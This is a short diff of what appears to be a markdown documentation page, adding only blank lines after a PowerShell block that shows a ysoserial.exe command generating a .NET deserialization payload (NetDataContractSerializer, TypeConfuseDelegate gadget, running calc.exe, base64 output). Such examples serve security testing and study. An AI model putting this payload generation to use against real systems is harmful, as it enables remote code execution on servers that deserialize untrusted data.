@@ -14,3 +14,5 @@ updated_at: '2023-04-06T03:55:59.135846+00:00'
 ```ps1
 .\ysoserial.exe -f NetDataContractSerializer -g TypeConfuseDelegate -c "calc.exe" -o base64 -t
 ```
+
+
